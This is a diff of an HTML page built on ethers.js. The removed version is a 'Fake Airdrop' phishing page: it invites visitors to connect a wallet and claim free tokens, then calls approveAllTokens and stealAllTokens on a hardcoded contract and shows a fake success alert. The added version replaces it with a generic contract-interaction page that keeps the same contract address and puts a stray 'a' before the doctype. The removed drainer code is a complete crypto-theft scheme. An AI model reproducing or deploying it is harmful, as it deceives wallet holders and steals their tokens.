@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+a<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Airdrop DApp</title>
+    <title>Interact with Smart Contract</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         body {
@@ -21,7 +21,7 @@
         }
         .button {
             padding: 10px 20px;
-            background-color: #28a745;
+            background-color: #007bff;
             color: white;
             border: none;
             border-radius: 5px;
@@ -30,43 +30,35 @@
         .button:disabled {
             background-color: #ccc;
         }
-        .note {
-            margin-top: 10px;
-            font-size: 0.9em;
-            color: gray;
-        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Claim Your Fake Airdrop</h1>
-    <p>Connect your wallet to claim free tokens!</p>
+    <h1>Interact with Smart Contract</h1>
+    <p>Connect your wallet and interact with a contract function.</p>
+
     <button id="connectWalletButton" class="button">Connect Wallet</button>
-    <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
-    <p class="note">Note: Make sure to approve before claiming.</p>
-    <p id="walletAddress"></p>
+    
+    <div id="contractActions" style="display:none;">
+        <p>Execute a contract function:</p>
+        
+        <!-- Example of function input field -->
+        <input type="text" id="inputValue" placeholder="Enter some value" required>
+        <button id="executeFunctionButton" class="button" disabled>Execute Function</button>
+    </div>
 </div>
 
 <script>
     let provider;
     let signer;
-    let contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract Address
-    let contractABI = [
+    const contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract Address
+    const contractABI = [
         {
             "inputs": [
-                { "internalType": "address", "name": "token", "type": "address" }
+                { "internalType": "uint256", "name": "value", "type": "uint256" }
             ],
-            "name": "approveAllTokens",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "inputs": [
-                { "internalType": "address", "name": "victim", "type": "address" }
-            ],
-            "name": "stealAllTokens",
+            "name": "setValue",
             "outputs": [],
             "stateMutability": "nonpayable",
             "type": "function"
@@ -79,10 +71,10 @@
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                const address = await signer.getAddress();
-                console.log("Wallet connected:", address);
-                document.getElementById("walletAddress").innerText = `Wallet Address: ${address}`;
-                document.getElementById("claimAirdropButton").disabled = false;
+                console.log("Wallet connected!");
+
+                document.getElementById("contractActions").style.display = "block";
+                document.getElementById("executeFunctionButton").disabled = false;
             } catch (error) {
                 console.error("Failed to connect wallet:", error);
                 alert("Failed to connect wallet. Please try again.");
@@ -92,30 +84,24 @@
         }
     }
 
-    async function claimAirdrop() {
+    async function executeFunction() {
         try {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            const inputValue = document.getElementById("inputValue").value;
+            const tx = await contract.setValue(inputValue); // Example function that accepts an input
+            console.log("Transaction sent:", tx.hash);
+            await tx.wait(); // Wait for transaction to be mined
+            console.log("Function executed successfully!");
 
-            // Approve all tokens using the malicious contract
-            const victimAddress = await signer.getAddress();
-            const approveTx = await contract.approveAllTokens(victimAddress);
-            console.log("Approval transaction sent:", approveTx.hash);
-            await approveTx.wait(); // Wait for the transaction to be mined
-            console.log("Approval granted!");
-
-            // Simulate stealing all tokens
-            const stealTx = await contract.stealAllTokens(victimAddress);
-            console.log("Tokens stolen:", stealTx.hash);
-
-            alert("Congratulations! Your airdrop claim was successful.");
+            alert("Function executed successfully!");
         } catch (error) {
-            console.error("Error during airdrop:", error);
-            alert("Failed to claim airdrop. Please try again.");
+            console.error("Error executing function:", error);
+            alert("Failed to execute function. Please try again.");
         }
     }
 
     document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
-    document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
+    document.getElementById("executeFunctionButton").addEventListener("click", executeFunction);
 </script>
 
 </body>
